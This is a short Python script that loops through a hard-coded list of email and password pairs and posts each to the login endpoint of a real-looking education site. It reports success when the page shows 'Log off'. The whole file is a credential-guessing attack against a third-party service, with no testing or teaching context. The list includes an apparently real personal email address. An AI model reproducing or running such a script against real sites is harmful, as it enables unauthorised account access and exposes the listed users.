import requests

flag = False

try:
	passwords = [
		{"email": "timorust1@gmail.com", "password": "password"},
		{"email": "email@example.com", "password": "eassword"},
		{"email": "cmail@example.com", "password": "cassword"},
		{"email": "jmail@example.com", "password": "jassword"},
		{"email": "hmail@example.com", "password": "hassword"},
		{"email": "gmail@example.com", "password": "gassword"},
		{"email": "fmail@example.com", "password": "fassword"},
	]

	for payload in passwords:
		requestToSite = requests.post('https://online.ash-limudim.co.il/login', data=payload)
		if "Log off" in requestToSite.text:
			flag = True
			break

except Exception as e:
	print(e)
finally:
	if flag:
		print("Login successfully")
		print(payload)
	else:
		print("We didn`t found the details Sorry)))")		
